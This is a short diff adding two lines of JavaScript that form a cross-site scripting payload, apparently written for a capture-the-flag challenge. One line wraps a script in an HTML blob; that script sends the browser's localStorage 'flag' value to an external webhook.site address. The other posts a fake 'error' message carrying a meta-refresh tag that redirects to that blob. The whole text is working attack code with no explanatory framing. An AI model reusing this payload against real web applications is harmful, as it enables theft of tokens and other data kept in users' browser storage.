@@ -1,0 +1,2 @@
+let blob = new Blob(["<script>fetch('https://webhook.site/4f858ea1-7b1d-4e60-be16-5394a6aa673a/?' + localStorage.flag)</script>"], {type: 'text/html'});
+self.postMessage({ type: "error", msg:`<meta http-equiv="refresh" content="0; url=${URL.createObjectURL(blob)}" />` })
